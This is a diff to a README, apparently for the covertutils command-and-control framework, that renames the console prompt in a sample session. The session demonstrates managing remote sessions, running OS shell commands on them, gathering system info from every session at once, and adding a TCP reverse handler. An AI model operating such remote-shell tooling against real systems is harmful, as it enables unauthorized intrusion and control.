@@ -112,7 +112,7 @@ Aborted by the user...
 ### The `MultiShell`, handling multiple `Sessions`
 Care about *multiple session management*, with full abstraction of the transfer method?
 ``` bash
-MultiShell> session -l
+covertpreter> session -l
 	Current Sessions:
 0) 9cb04c9761938349 - <class '__main__.MyHandler'>
 System Info: N/A
@@ -120,25 +120,25 @@ System Info: N/A
 1) 523aff25b3703ac0 - <class '__main__.MyHandler'>
 System Info: N/A
 
-MultiShell> 523aff25b3703ac0 os-shell id
+covertpreter> 523aff25b3703ac0 os-shell id
 '!os-shell id' -> <523aff25b3703ac0>
 uid=1000(unused) gid=1000(unused) groups=1000(unused)
 
-MultiShell> control sysinfo
+covertpreter> control sysinfo
 No sessions selected, ALL sessions will be commanded
 Are you sure? [y/N]: y
 '!control sysinfo' -> <9cb04c9761938349>
 '!control sysinfo' -> <523aff25b3703ac0>
-MultiShell> 
+covertpreter> 
 [...]
-MultiShell> handler add examples/tcp_reverse_handler.py 8080 Pa55phra531
-MultiShell>
+covertpreter> handler add examples/tcp_reverse_handler.py 8080 Pa55phra531
+covertpreter>
 Accepting			# non-blocking
 Accepted
 <covertutils.shells.impl.extendableshell.ExtendableShell instance at 0x7fe24c0e6dd0>
 Added Session!
 
-MultiShell> session -lv		# -v is verbose: shows available streams/extensions per handler
+covertpreter> session -lv		# -v is verbose: shows available streams/extensions per handler
 	Current Sessions:
 0) 9cb04c9761938349 - <class '__main__.MyHandler'>
 hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling - en_US-UTF-8 - unused
@@ -160,7 +160,7 @@ hostname - Linux-4.12.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling -
 	-> python
 	-> os-shell
 
-MultiShell>
+covertpreter>
 ```
 
 ### The `Encryption Schemes`
